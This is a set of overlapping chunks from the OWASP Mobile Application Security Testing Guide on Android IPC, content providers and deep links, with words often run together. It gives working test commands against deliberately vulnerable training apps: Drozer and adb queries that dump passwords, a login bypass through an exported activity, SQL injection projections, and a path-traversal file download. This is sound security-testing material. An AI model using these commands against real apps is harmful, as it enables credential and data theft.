=newString(usernameBase64Byte,\"UTF-8\"); final Stringpassword =settings.getString(\"superSecurePassword\",null); CryptoClasscrypt =newCryptoClass(); StringdecryptedPassword =crypt.aesDeccryptedString(password); StringtextPhoneno =phn.toString(); StringtextMessage =\"UpdatedPasswordfrom:\"+decryptedPassword+\"to: \"+newpass; SmsManagersmsManager =SmsManager.getDefault(); System.out.println(\"Forthechangepassword-phonenumber:\"+textPhoneno+\"password is:\"+textMessage); smsManager.sendTextMessage(textPhoneno,null,textMessage,null,null); } } } } BroadcastReceiversshouldusetheandroid:permissionattribute; otherwise, otherapplicationscaninvokethem. You canuseContext.sendBroadcast(intent, receiverPermission);tospecifypermissionsareceivermusthavetoread thebroadcast. YoucanalsosetanexplicitapplicationpackagenamethatlimitsthecomponentsthisIntentwillresolve to. Ifleftasthedefaultvalue(null),allcomponentsinallapplicationswillbeconsidered. Ifnon-null,theIntentcanmatch onlythecomponentsinthegivenapplicationpackage. Dynamic Analysis YoucanenumerateIPCcomponentswithMobSF.TolistallexportedIPCcomponents,uploadtheAPKfileandthecompo- nentscollectionwillbedisplayedinthefollowingscreen: Content Providers The “Sieve” application implements a vulnerable content provider. To list the content providers exported by the Sieve app,executethefollowingcommand: $adbshelldumpsyspackagecom.mwr.example.sieve |grep -Po\"Provider{[\\w\\d\\s\\./]+}\" |sort -u Provider{34a20d5com.mwr.example.sieve/.FileBackupProvider} Provider{64f10eacom.mwr.example.sieve/.DBContentProvider} Once identified, you can use jadx to reverse engineer the app and analyze the source code of the exported content providerstoidentifypotentialvulnerabilities. Toidentifythecorrespondingclassofacontentprovider,usethefollowinginformation: 272\\n• PackageName: com.mwr.example.sieve. • ContentProviderClassName: DBContentProvider. Whenanalyzingtheclasscom.mwr.example.sieve.DBContentProvider,you’llseethatitcontainsseveralURIs: package com.mwr.example.sieve; ... public class DBContentProvider extends ContentProvider { public static final UriKEYS_URI =Uri.parse(\"content://com.mwr.example.sieve.DBContentProvider/Keys\"); public static final UriPASSWORDS_URI =Uri.parse(\"content://com.mwr.example.sieve.DBContentProvider/Passwords\"); ... } UsethefollowingcommandstocallthecontentproviderusingtheidentifiedURIs: $adbshellcontentquery --uri content://com.mwr.example.sieve.DBContentProvider/Keys/ Row:0Password=1234567890AZERTYUIOPazertyuiop,pin=1234 $adbshellcontentquery --uri content://com.mwr.example.sieve.DBContentProvider/Passwords/ Row:0_id=1,service=test,username=test,password=BLOB,email=t@tedt.com Row:1_id=2,service=bank,username=owasp,password=BLOB,email=user@tedt.com $adbshellcontentquery --uri content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection email:username:password --where 'service=\\\"bank\\\"' Row:0email=user@tedt.com,username=owasp,password=BLOB Youareablenowtoretrievealldatabaseentries(seealllinesstartingwith“Row:” intheoutput). Activities Tolistactivitiesexportedbyanapplication,youcanusethefollowingcommandandfocusonactivityelements: $aaptdxmltreesieve.apkAndroidManifest.xml ... E:activity (line=32) A:android:label(0x01010001)=@0x7f05000f A:android:name(0x01010003)=\".FileSelectActivity\" (Raw: \".FileSelectActivity\") A:android:exported(0x01010010)=(type0x12)0xffffffff A:android:finishOnTaskLaunch(0x01010014)=(type0x12)0xffffffff A:android:clearTaskOnLaunch(0x01010015)=(type0x12)0xffffffff A:android:excludeFromRecents(0x01010017)=(type0x12)0xffffffff E:activity (line=40) A:android:label(0x01010001)=@0x7f050000 A:android:name(0x01010003)=\".MainLoginActivity\" (Raw: \".MainLoginActivity\") A:android:excludeFromRecents(0x01010017)=(type0x12)0xffffffff A:android:launchMode(0x0101001d)=(type0x10)0x2 A:android:windowSoftInputMode(0x0101022b)=(type0x11)0x14 E:intent-filter (line=46) E:action (line=47) A:android:name(0x01010003)=\"android.intent.action.MAIN\" (Raw: \"android.intent.action.MAIN\") E:category (line=49) A:android:name(0x01010003)=\"android.intent.category.LAUNCHER\" (Raw: \"android.intent.category.LAUNCHER\") E:activity (line=52) A:android:label(0x01010001)=@0x7f050009 A:android:name(0x01010003)=\".PWList\" (Raw: \".PWList\") A:android:exported(0x01010010)=(type0x12)0xffffffff A:android:finishOnTaskLaunch(0x01010014)=(type0x12)0xffffffff A:android:clearTaskOnLaunch(0x01010015)=(type0x12)0xffffffff A:android:excludeFromRecents(0x01010017)=(type0x12)0xffffffff E:activity (line=60) A:android:label(0x01010001)=@0x7f05000a A:android:name(0x01010003)=\".SettingsActivity\" (Raw: \".SettingsActivity\") A:android:finishOnTaskLaunch(0x01010014)=(type0x12)0xffffffff A:android:clearTaskOnLaunch(0x01010015)=(type0x12)0xffffffff A:android:excludeFromRecents(0x01010017)=(type0x12)0xffffffff ... Youcanidentifyanexportedactivityusingoneofthefollowingproperties: • Ithaveanintent-filtersubdeclaration. • Ithavetheattributeandroid:exportedto0xffffffff. YoucanalsousejadxtoidentifyexportedactivitiesinthefileAndroidManifest.xmlusingthecriteriadescribedabove: 273\\n<?xml version=\"1.0\" encoding=\"utf-8\"?> <manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" package=\"com.mwr.example.sieve\"> ... Thisactivityisexportedviatheattribute\"exported\" <activity android:name=\".FileSelectActivity\" android:exported=\"true\" /> Thisactivityisexportedviathe\"intent-filter\"declaration <activity android:name=\".MainLoginActivity\"> <intent-filter> <action android:name=\"android.intent.action.MAIN\"/> <category android:name=\"android.intent.category.LAUNCHER\"/> </intent-filter> </activity> Thisactivityisexportedviatheattribute\"exported\" <activity android:name=\".PWList\" android:exported=\"true\" /> Activitiesbelowarenotexported <activity android:name=\".SettingsActivity\" /> <activity android:name=\".AddEntryActivity\"/> <activity android:name=\".ShortLoginActivity\" /> <activity android:name=\".WelcomeActivity\" /> <activity android:name=\".PINActivity\" /> ... </manifest> Enumeratingactivitiesinthevulnerablepasswordmanager“Sieve”showsthatthefollowingactivitiesareexported: • .MainLoginActivity • .PWList •",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 103
    }
  },
  {
    "text": "273\\n<?xml version=\"1.0\" encoding=\"utf-8\"?> <manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" package=\"com.mwr.example.sieve\"> ... Thisactivityisexportedviatheattribute\"exported\" <activity android:name=\".FileSelectActivity\" android:exported=\"true\" /> Thisactivityisexportedviathe\"intent-filter\"declaration <activity android:name=\".MainLoginActivity\"> <intent-filter> <action android:name=\"android.intent.action.MAIN\"/> <category android:name=\"android.intent.category.LAUNCHER\"/> </intent-filter> </activity> Thisactivityisexportedviatheattribute\"exported\" <activity android:name=\".PWList\" android:exported=\"true\" /> Activitiesbelowarenotexported <activity android:name=\".SettingsActivity\" /> <activity android:name=\".AddEntryActivity\"/> <activity android:name=\".ShortLoginActivity\" /> <activity android:name=\".WelcomeActivity\" /> <activity android:name=\".PINActivity\" /> ... </manifest> Enumeratingactivitiesinthevulnerablepasswordmanager“Sieve”showsthatthefollowingactivitiesareexported: • .MainLoginActivity • .PWList • .FileSelectActivity Usethecommandbelowtolaunchanactivity: ##Starttheactivitywithoutspecifyinganactionorancategory $adbshellamstart -ncom.mwr.example.sieve/.PWList Starting:Intent{cmp=com.mwr.example.sieve/.PWList} ##Starttheactivityindicatinganaction(-a)andancategory(-c) $adbshellamstart -n\"com.mwr.example.sieve/.MainLoginActivity\" -aandroid.intent.action.MAIN -candroid.intent.category.LAUNCHER Starting:Intent{act=android.intent.action.MAINcat=[android.intent.category.LAUNCHER]cmp=com.mwr.example.sieve/.MainLoginActivity} Sincetheactivity.PWListiscalleddirectlyinthisexample,youcanuseittobypasstheloginformprotectingthepassword manager,andaccessthedatacontainedwithinthepasswordmanager. Services ServicescanbeenumeratedwiththeDrozermoduleapp.service.info: dz>runapp.service.info -acom.mwr.example.sieve Package:com.mwr.example.sieve com.mwr.example.sieve.AuthService Permission:null com.mwr.example.sieve.CryptoService Permission:null Tocommunicatewithaservice,youmustfirstusestaticanalysistoidentifytherequiredinputs. Becausethisserviceisexported,youcanusethemoduleapp.service.sendtocommunicatewiththeserviceandchange thepasswordstoredinthetargetapplication: dz>runapp.service.sendcom.mwr.example.sievecom.mwr.example.sieve.AuthService --msg 63457452 1 --extra stringcom.mwr.example.sieve.PASSWORD ↪ \"abcdabcdabcdabcd\" --bundle-as-obj Gotareplyfromcom.mwr.example.sieve/com.mwr.example.sieve.AuthService: what:4 arg1:42 arg2:0 Empty Broadcast Receivers Tolist broadcastreceiversexportedby an application, you can use thefollowing command and focus onreceiver ele- ments: 274\\n$aaptdxmltreeInsecureBankv2.apkAndroidManifest.xml ... E:receiver (line=88) A:android:name(0x01010003)=\"com.android.insecurebankv2.MyBroadCastReceiver\" (Raw: \"com.android.insecurebankv2.MyBroadCastReceiver\") A:android:exported(0x01010010)=(type0x12)0xffffffff E:intent-filter (line=91) E:action (line=92) A:android:name(0x01010003)=\"theBroadcast\" (Raw: \"theBroadcast\") E:receiver (line=119) A:android:name(0x01010003)=\"com.google.android.gms.wallet.EnableWalletOptimizationReceiver\" (Raw: ↪ \"com.google.android.gms.wallet.EnableWalletOptimizationReceiver\") A:android:exported(0x01010010)=(type0x12)0x0 E:intent-filter (line=122) E:action (line=123) A:android:name(0x01010003)=\"com.google.android.gms.wallet.ENABLE_WALLET_OPTIMIZATION\" (Raw: \"com.google.android.gms.wallet.ENABLE_WALLET_OPTIMIZATION\") ... Youcanidentifyanexportedbroadcastreceiverusingoneofthefollowingproperties: • Ithasanintent-filtersubdeclaration. • Ithastheattributeandroid:exportedsetto0xffffffff. YoucanalsousejadxtoidentifyexportedbroadcastreceiversinthefileAndroidManifest.xmlusingthecriteriadescribed above: <?xml version=\"1.0\" encoding=\"utf-8\"?> <manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" package=\"com.android.insecurebankv2\"> ... Thisbroadcastreceiverisexportedviatheattribute\"exported\"aswellasthe\"intent-filter\"declaration <receiver android:name=\"com.android.insecurebankv2.MyBroadCastReceiver\" android:exported=\"true\"> <intent-filter> <action android:name=\"theBroadcast\"/> </intent-filter> </receiver> ThisbroadcastreceiverisNOTexportedbecausetheattribute\"exported\"isexplicitlysettofalse <receiver android:name=\"com.google.android.gms.wallet.EnableWalletOptimizationReceiver\" android:exported=\"false\"> <intent-filter> <action android:name=\"com.google.android.gms.wallet.ENABLE_WALLET_OPTIMIZATION\"/> </intent-filter> </receiver> ... </manifest> The above example from the vulnerable banking application InsecureBankv2 shows that only the broadcast receiver namedcom.android.insecurebankv2.MyBroadCastReceiverisexported. Nowthatyouknowthatthereisanexportedbroadcastreceiver,youcandivedeeperandreverseengineertheappusing jadx. Thiswillallowyoutoanalyzethesourcecodesearchingforpotentialvulnerabilitiesthatyoucouldlatertrytoexploit. Thesourcecodeoftheexportedbroadcastreceiveristhefollowing: package com.android.insecurebankv2; ... public class MyBroadCastReceiver extends BroadcastReceiver { public static final StringMYPREFS =\"mySharedPreferences\"; StringusernameBase64ByteString; public void onReceive(Contextcontext,Intentintent){ Stringphn =intent.getStringExtra(\"phonenumber\"); Stringnewpass =intent.getStringExtra(\"newpass\"); if(phn!=null){ try{ SharedPreferencessettings =context.getSharedPreferences(\"mySharedPreferences\",1); this.usernameBase64ByteString =newString(Base64.decode(settings.getString(\"EncryptedUsername\",(String)null),0),\"UTF-8\"); StringdecryptedPassword =newCryptoClass().aesDeccryptedString(settings.getString(\"superSecurePassword\",(String)null)); StringtextPhoneno =phn.toString(); StringtextMessage =\"UpdatedPasswordfrom:\" +decryptedPassword +\"to: \" +newpass; SmsManagersmsManager =SmsManager.getDefault(); System.out.println(\"Forthechangepassword-phonenumber:\" + textPhoneno +\"password is:\" +textMessage); smsManager.sendTextMessage(textPhoneno,(String)null,textMessage,(PendingIntent)null,(PendingIntent)null); }catch (Exceptione){ e.printStackTrace(); } }else { System.out.println(\"Phonenumberisnull\"); } } } As you can see in the source code, this broadcast receiver expects two parameters named phonenumber and newpass. Withthisinformationyoucannowtrytoexploitthisbroadcastreceiverbysendingeventstoitusingcustomvalues: 275\\n##Sendaneventwiththefollowingproperties: ##Actionissetto\"theBroadcast\" ##Parameter\"phonenumber\"issettothestring\"07123456789\" ##Parameter\"newpass\"issettothestring\"12345\" $adbshellambroadcast -atheBroadcast --es phonenumber \"07123456789\" --es newpass \"12345\" Broadcasting:Intent{act=theBroadcastflg=0x400000 (hasextras)} Broadcastcompleted:result=0 ThisgeneratesthefollowingSMS: UpdatedPasswordfrom:SecretPassword@to:12345 Sniffing Intents IfanAndroidapplicationbroadcastsintentswithoutsettingarequiredpermissionorspecifyingthedestinationpackage, theintentscanbemonitoredbyanyapplicationthatrunsonthedevice. Toregisterabroadcastreceivertosniffintents,usetheDrozermoduleapp.broadcast.sniffandspecifytheactionto monitorwiththe--actionparameter: dz>runapp.broadcast.sniff --action theBroadcast [*]Broadcastreceiverregisteredtosniffmatchingintents [*]Outputisupdatedonceasecond.PressControl+Ctoexit. Action:theBroadcast Raw:Intent{act=theBroadcastflg=0x10 (hasextras)} Extra:phonenumber=07123456789 (java.lang.String) Extra:newpass=12345 (java.lang.String)` You can also use the following command to sniff the intents. However, the content of the extras passed will not be displayed: $adbshelldumpsysactivitybroadcasts |grep \"theBroadcast\" BroadcastRecord{fc2f46fu0theBroadcast}touser0 Intent{act=theBroadcastflg=0x400010 (hasextras)} BroadcastRecord{7d4f24du0theBroadcast}touser0 Intent{act=theBroadcastflg=0x400010 (hasextras)} 45:act=theBroadcastflg=0x400010 (hasextras) 46:act=theBroadcastflg=0x400010 (hasextras) 121:act=theBroadcastflg=0x400010 (hasextras) 144:act=theBroadcastflg=0x400010 (hasextras) Determining Whether Sensitive Stored Data Has Been Exposed via IPC Mechanisms Platform: android MASVSV1: MSTG-STORAGE-6 MASVSV2: MASVS-PLATFORM-1 Overview Static Analysis ThefirststepistolookatAndroidManifest.xmltodetectcontentprovidersexposedbytheapp. Youcanidentifycontent providersbythe<provider>element. Completethefollowingsteps: • Determinewhetherthevalueoftheexporttag(android:exported)is\"true\". Evenifitisnot,thetagwillbesetto \"true\"automaticallyifan<intent-filter>hasbeendefinedforthetag. Ifthecontentismeanttobeaccessed onlybytheappitself,setandroid:exportedto\"false\". Ifnot,settheflagto\"true\"anddefineproperread/write permissions. • Determinewhetherthedataisbeingprotectedbyapermissiontag(android:permission). Permissiontagslimit exposuretootherapps. 276\\n• Determinewhethertheandroid:protectionLevelattributehasthevaluesignature. Thissettingindicatesthat the data is intended to be accessed only by apps from the same enterprise (i.e., signed with the same key). To make the data accessible to other apps, apply a security policy with the <permission> element and set a properandroid:protectionLevel. Ifyouuseandroid:permission,otherapplicationsmustdeclarecorrespond- ing <uses-permission> elements in their manifests to interact with your content provider. You can use the an- droid:grantUriPermissionsattributetograntmorespecificaccesstootherapps;youcanlimitaccesswiththe <grant-uri-permission>element. Inspectthesourcecodetounderstandhowthecontentproviderismeanttobeused. Searchforthefollowingkeywords: • android.content.ContentProvider • android.database.Cursor • android.database.sqlite • .query • .update • .delete ToavoidSQLinjectionattackswithintheapp,useparameterizedquerymethods,suchasquery,update,anddelete. Besuretoproperlysanitizeallmethodarguments;forexample,theselectionargumentcouldleadtoSQLinjection ifitismadeupofconcatenateduserinput. If you expose a content provider, determine whether parameterized query methods (query, update, and delete) are beingusedtopreventSQLinjection. Ifso,makesurealltheirargumentsareproperlysanitized. WewillusethevulnerablepasswordmanagerappSieveasanexampleofavulnerablecontentprovider. Inspect the Android Manifest Identifyalldefined<provider>elements: <provider android:authorities=\"com.mwr.example.sieve.DBContentProvider\" android:exported=\"true\" android:multiprocess=\"true\" android:name=\".DBContentProvider\"> <path-permission android:path=\"/Keys\" android:readPermission=\"com.mwr.example.sieve.READ_KEYS\" android:writePermission=\"com.mwr.example.sieve.WRITE_KEYS\" /> </provider> <provider android:authorities=\"com.mwr.example.sieve.FileBackupProvider\" android:exported=\"true\" android:multiprocess=\"true\" android:name=\".FileBackupProvider\" /> AsshownintheAndroidManifest.xmlabove,theapplicationexportstwocontentproviders. Notethatonepath(“/Keys”) isprotectedbyreadandwritepermissions.",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 104
    }
  },
  {
    "text": ".update • .delete ToavoidSQLinjectionattackswithintheapp,useparameterizedquerymethods,suchasquery,update,anddelete. Besuretoproperlysanitizeallmethodarguments;forexample,theselectionargumentcouldleadtoSQLinjection ifitismadeupofconcatenateduserinput. If you expose a content provider, determine whether parameterized query methods (query, update, and delete) are beingusedtopreventSQLinjection. Ifso,makesurealltheirargumentsareproperlysanitized. WewillusethevulnerablepasswordmanagerappSieveasanexampleofavulnerablecontentprovider. Inspect the Android Manifest Identifyalldefined<provider>elements: <provider android:authorities=\"com.mwr.example.sieve.DBContentProvider\" android:exported=\"true\" android:multiprocess=\"true\" android:name=\".DBContentProvider\"> <path-permission android:path=\"/Keys\" android:readPermission=\"com.mwr.example.sieve.READ_KEYS\" android:writePermission=\"com.mwr.example.sieve.WRITE_KEYS\" /> </provider> <provider android:authorities=\"com.mwr.example.sieve.FileBackupProvider\" android:exported=\"true\" android:multiprocess=\"true\" android:name=\".FileBackupProvider\" /> AsshownintheAndroidManifest.xmlabove,theapplicationexportstwocontentproviders. Notethatonepath(“/Keys”) isprotectedbyreadandwritepermissions. Inspect the source code InspectthequeryfunctionintheDBContentProvider.javafiletodeterminewhetheranysensitiveinformationisbeing leaked: ExampleinJava: public Cursor query(final Uriuri,final String[]array,final Strings,final String[]array2,final Strings2){ final intmatch =this.sUriMatcher.match(uri); final SQLiteQueryBuildersqLiteQueryBuilder =newSQLiteQueryBuilder(); if(match >=100&& match <200){ sqLiteQueryBuilder.setTables(\"Passwords\"); } else if(match >=200){ sqLiteQueryBuilder.setTables(\"Key\"); } return sqLiteQueryBuilder.query(this.pwdb.getReadableDatabase(),array,s,array2,(String)null,(String)null,s2); } 277\\nExampleinKotlin: funquery(uri:Uri?,array:Array<String?>?,s:String?,array2:Array<String?>?,s2:String?):Cursor { valmatch:Int=this.sUriMatcher.match(uri) valsqLiteQueryBuilder =SQLiteQueryBuilder() if(match >=100&& match <200){ sqLiteQueryBuilder.tables =\"Passwords\" }else if(match >=200){ sqLiteQueryBuilder.tables =\"Key\" } return sqLiteQueryBuilder.query(this.pwdb.getReadableDatabase(),array,s,array2,null asString?,null asString?,s2) } Here we see that there are actually two paths, “/Keys” and “/Passwords”, and the latter is not being protected in the manifestandisthereforevulnerable. WhenaccessingaURI,thequerystatementreturnsallpasswordsandthepathPasswords/. Wewilladdressthisinthe “DynamicAnalysis”sectionandshowtheexactURIthatisrequired. Dynamic Analysis Testing Content Providers To dynamically analyze an application’s content providers, first enumerate the attack surface: pass the app’s package nametotheDrozermoduleapp.provider.info: dz>runapp.provider.info -acom.mwr.example.sieve Package:com.mwr.example.sieve Authority:com.mwr.example.sieve.DBContentProvider ReadPermission:null WritePermission:null ContentProvider:com.mwr.example.sieve.DBContentProvider MultiprocessAllowed:True GrantUriPermissions:False PathPermissions: Path:/Keys Type:PATTERN_LITERAL ReadPermission:com.mwr.example.sieve.READ_KEYS WritePermission:com.mwr.example.sieve.WRITE_KEYS Authority:com.mwr.example.sieve.FileBackupProvider ReadPermission:null WritePermission:null ContentProvider:com.mwr.example.sieve.FileBackupProvider MultiprocessAllowed:True GrantUriPermissions:False Inthisexample,twocontentprovidersareexported. Bothcanbeaccessedwithoutpermission,exceptforthe/Keyspath intheDBContentProvider. Withthisinformation,youcanreconstructpartofthecontentURIstoaccesstheDBContent- Provider(theURIsbeginwithcontent://). ToidentifycontentproviderURIswithintheapplication,useDrozer’sscanner.provider.findurismodule. Thismodule guessespathsanddeterminesaccessiblecontentURIsinseveralways: dz>runscanner.provider.finduris -acom.mwr.example.sieve Scanningcom.mwr.example.sieve... UnabletoQuerycontent://com.mwr.example.sieve.DBContentProvider/ ... UnabletoQuerycontent://com.mwr.example.sieve.DBContentProvider/Keys AccessiblecontentURIs: content://com.mwr.example.sieve.DBContentProvider/Keys/ content://com.mwr.example.sieve.DBContentProvider/Passwords content://com.mwr.example.sieve.DBContentProvider/Passwords/ Onceyouhavealistofaccessiblecontentproviders,trytoextractdatafromeachproviderwiththeapp.provider.query module: dz>runapp.provider.querycontent://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical _id:1 service:Email username:incognitoguy50 password:PSFjqXIMVa5NJFudgDuuLVgJYFD+8w== (Base64 -encoded) email:incognitoguy50@gmail.com YoucanalsouseDrozertoinsert,update,anddeleterecordsfromavulnerablecontentprovider: 278\\n• Insertrecord dz>runapp.provider.insert content://com.vulnerable.im/messages --stringdate 1331763850325 --stringtype 0 --integer_id 7 • Updaterecord dz>runapp.provider.update content://settings/secure --selection \"name=?\" --selection-argsassisted_gps_enabled --integervalue 0 • Deleterecord dz>runapp.provider.delete content://settings/secure --selection \"name=?\" --selection-argsmy_setting SQL Injection in Content Providers TheAndroidplatformpromotesSQLitedatabasesforstoringuserdata. BecausethesedatabasesarebasedonSQL,they may be vulnerable to SQL injection. You can use the Drozer module app.provider.query to test for SQL injection by manipulatingtheprojectionandselectionfieldsthatarepassedtothecontentprovider: dz>runapp.provider.querycontent://com.mwr.example.sieve.DBContentProvider/Passwords/--projection\"'\" unrecognizedtoken:\"'FROMPasswords\"(code1):,whilecompiling:SELECT'FROMPasswords dz>runapp.provider.querycontent://com.mwr.example.sieve.DBContentProvider/Passwords/--selection\"'\" unrecognizedtoken:\"')\"(code1):,whilecompiling:SELECT*FROMPasswordsWHERE(') If an application is vulnerable to SQL Injection, it will return a verbose error message. SQL Injection on Android may be used to modify or query data from the vulnerable content provider. In the following example, the Drozer module app.provider.queryisusedtolistallthedatabasetables: dz>runapp.provider.querycontent://com.mwr.example.sieve.DBContentProvider/Passwords/--projection\"* FROMSQLITE_MASTERWHEREtype='table';--\" |type |name |tbl_name |rootpage|sql | |table|android_metadata|android_metadata|3 |CREATETABLE...| |table|Passwords |Passwords |4 |CREATETABLE...| |table|Key |Key |5 |CREATETABLE...| SQLInjectionmayalsobeusedtoretrievedatafromotherwiseprotectedtables: dz>runapp.provider.querycontent://com.mwr.example.sieve.DBContentProvider/Passwords/--projection\"*FROMKey;--\" |Password|pin| |thisismypassword|9876| You can automate these steps with the scanner.provider.injection module, which automatically finds vulnerable contentproviderswithinanapp: dz>runscanner.provider.injection-acom.mwr.example.sieve Scanningcom.mwr.example.sieve... InjectioninProjection: content://com.mwr.example.sieve.DBContentProvider/Keys/ content://com.mwr.example.sieve.DBContentProvider/Passwords content://com.mwr.example.sieve.DBContentProvider/Passwords/ InjectioninSelection: content://com.mwr.example.sieve.DBContentProvider/Keys/ content://com.mwr.example.sieve.DBContentProvider/Passwords content://com.mwr.example.sieve.DBContentProvider/Passwords/ File System Based Content Providers Contentproviderscanprovideaccesstotheunderlyingfilesystem. Thisallowsappstosharefiles(theAndroidsandbox normallypreventsthis). YoucanusetheDrozermodulesapp.provider.readandapp.provider.downloadtoreadand download files, respectively, from exported file-based content providers. These content providers are susceptible to directorytraversal,whichallowsotherwiseprotectedfilesinthetargetapplication’ssandboxtoberead. 279\\ndz>runapp.provider.downloadcontent://com.vulnerable.app.FileProvider/../../../../../../../../data/data/com.vulnerable.app/database.db/home/user/database.db Written24488bytes Usethescanner.provider.traversalmoduletoautomatetheprocessoffindingcontentprovidersthataresusceptible todirectorytraversal: dz>runscanner.provider.traversal-acom.mwr.example.sieve Scanningcom.mwr.example.sieve... VulnerableProviders: content://com.mwr.example.sieve.FileBackupProvider/ content://com.mwr.example.sieve.FileBackupProvider Notethatadbcanalsobeusedtoquerycontentproviders: $adbshellcontentquery --uri content://com.owaspomtg.vulnapp.provider.CredentialProvider/credentials Row:0id=1,username=admin,password=StrongPwd Row:1id=2,username=test,password=test ... Testing Deep Links Platform: android MASVSV1: MSTG-PLATFORM-3 MASVSV2: MASVS-PLATFORM-1 Overview Any existing deep links (including App Links) can potentially increase the app attack surface. Thisincludes many risks suchaslinkhijacking,sensitivefunctionalityexposure,etc. • Before Android 12 (API level 31), if the app has any non-verifiable links, it can cause the system to not verify all AndroidAppLinksforthatapp. • StartingonAndroid12(APIlevel31), appsbenefitfromareducedattacksurface. Agenericwebintentresolves totheuser’sdefaultbrowserappunlessthetargetappisapprovedforthespecificdomaincontainedinthatweb intent. Alldeeplinksmustbeenumeratedandverifiedforcorrectwebsiteassociation. Theactionstheyperformmustbewell tested,especiallyallinputdata,whichshouldbedeemeduntrustworthyandthusshouldalwaysbevalidated. Noneoftheinputfromthesesourcescanbetrusted;itmustbevalidatedand/orsanitized. Validationensuresprocessing ofdatathattheappisexpectingonly. Ifvalidationisnotenforced,anyinputcanbesenttotheapp,whichmayallowan attackerormaliciousapptoexploitappfunctionality. Static Analysis Check for Android OS Version The Android version in which the app runs also influences the risk of using deep links. Inspect the Android Manifest to checkifminSdkVersionis31orhigher. • BeforeAndroid12(APIlevel31),iftheapphasanynon-verifiabledeeplinks,itcancausethesystemtonotverify allAndroidAppLinksforthatapp. • StartingonAndroid12(APIlevel31), appsbenefitfromareducedattacksurface. Agenericwebintentresolves totheuser’sdefaultbrowserappunlessthetargetappisapprovedforthespecificdomaincontainedinthatweb intent. 280\\nCheck for Deep Link Usage InspectingtheAndroidManifest: Youcaneasilydeterminewhetherdeeplinks(withorwithoutcustomURLschemes)aredefinedbydecodingtheappusing apktoolandinspectingtheAndroidManifestfilelookingfor<intent-filter>elements. •",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 105
    }
  },
  {
    "text": "ofdatathattheappisexpectingonly. Ifvalidationisnotenforced,anyinputcanbesenttotheapp,whichmayallowan attackerormaliciousapptoexploitappfunctionality. Static Analysis Check for Android OS Version The Android version in which the app runs also influences the risk of using deep links. Inspect the Android Manifest to checkifminSdkVersionis31orhigher. • BeforeAndroid12(APIlevel31),iftheapphasanynon-verifiabledeeplinks,itcancausethesystemtonotverify allAndroidAppLinksforthatapp. • StartingonAndroid12(APIlevel31), appsbenefitfromareducedattacksurface. Agenericwebintentresolves totheuser’sdefaultbrowserappunlessthetargetappisapprovedforthespecificdomaincontainedinthatweb intent. 280\\nCheck for Deep Link Usage InspectingtheAndroidManifest: Youcaneasilydeterminewhetherdeeplinks(withorwithoutcustomURLschemes)aredefinedbydecodingtheappusing apktoolandinspectingtheAndroidManifestfilelookingfor<intent-filter>elements. • CustomUrlSchemes: ThefollowingexamplespecifiesadeeplinkwithacustomURLschemecalledmyapp://. <activity android:name=\".MyUriActivity\"> <intent-filter> <action android:name=\"android.intent.action.VIEW\" /> <category android:name=\"android.intent.category.DEFAULT\" /> <category android:name=\"android.intent.category.BROWSABLE\" /> <data android:scheme=\"myapp\" android:host=\"path\" /> </intent-filter> </activity> • Deep Links: ThefollowingexamplespecifiesadeepLinkusingboththehttp://andhttps://schemes,along withthehostandpaththatwillactivateit(inthiscase, thefullURLwouldbehttps://www.myapp.com/my/app/ path): <intent-filter> ... <data android:scheme=\"http\" android:host=\"www.myapp.com\" android:path=\"/my/app/path\" /> <data android:scheme=\"https\" android:host=\"www.myapp.com\" android:path=\"/my/app/path\" /> </intent-filter> • AppLinks:Ifthe<intent-filter>includestheflagandroid:autoVerify=\"true\",thiscausestheAndroidsystem toreachouttothedeclaredandroid:hostinanattempttoaccesstheDigitalAssetLinksfileinordertoverifythe AppLinks. AdeeplinkcanbeconsideredanAppLinkonlyiftheverificationissuccessful. <intent-filter android:autoVerify=\"true\"> Whenlistingdeeplinksrememberthat<data>elementswithinthesame<intent-filter>areactuallymergedtogether toaccountforallvariationsoftheircombinedattributes. <intent-filter> ... <data android:scheme=\"https\" android:host=\"www.example.com\" /> <data android:scheme=\"app\" android:host=\"open.my.app\" /> </intent-filter> It might seem as though this supports only https://www.example.com and app://open.my.app. However, it actually supports: • https://www.example.com • app://open.my.app • app://www.example.com • https://open.my.app UsingDumpsys: Useadbtorunthefollowingcommandthatwillshowallschemes: adbshelldumpsyspackagecom.example.package UsingAndroid“AppLinkVerification”Tester: UsetheAndroid“AppLinkVerification”Testerscripttolistalldeeplinks(list-all)oronlyapplinks(list-applinks): python3deeplink_analyser.py -oplist-all -apk ~/Downloads/example.apk .MainActivity app://open.my.app app://www.example.com https://open.my.app https://www.example.com 281\\nCheck for Correct Website Association Evenifdeeplinkscontaintheandroid:autoVerify=\"true\"attribute,theymustbeactuallyverifiedinordertobecon- sideredAppLinks. Youshouldtestforanypossiblemisconfigurationsthatmightpreventfullverification. Automatic Verification UsetheAndroid“AppLinkVerification”Testerscripttogettheverificationstatusforallapplinks(verify-applinks). See anexamplehere. OnlyonAndroid12(APIlevel31)orhigher: YoucanuseadbtotesttheverificationlogicregardlessofwhethertheapptargetsAndroid12(APIlevel31)ornot. This featureallowsyouto: • invoketheverificationprocessmanually. • resetthestateofthetargetapp’sAndroidAppLinksonyourdevice. • invokethedomainverificationprocess. Youcanalsoreviewtheverificationresults. Forexample: adbshellpmget-app-linkscom.example.package com.example.package: ID:01234567-89ab-cdef-0123-456789abcdef Signatures: [***] Domainverificationstate: example.com:verified sub.example.com:legacy_failure example.net:verified example.org:1026 Thesameinformationcanbefoundbyrunningadbshelldumpsyspackagecom.example.package(onlyonAndroid 12(APIlevel31)orhigher). Manual Verification Thissectiondetailsafew,ofpotentiallymany,reasonswhytheverificationprocessfailedorwasnotactuallytriggered. See more information in the Android Developers Documentation and in the white paper “Measuring the Insecurity of MobileDeepLinksofAndroid”. ChecktheDigitalAssetLinksfile: • CheckformissingDigitalAssetLinksfile: – try to find it in the domain’s /.well-known/ path. Example: https://www.example.com/.well-known/ assetlinks.json – or try https://digitalassetlinks.googleapis.com/v1/statements:list?source.web.site=www. example.com • CheckforvalidDigitalAssetLinksfileservedviaHTTP. • CheckforinvalidDigitalAssetLinksfilesservedviaHTTPS.Forexample: – thefilecontainsinvalidJSON. – 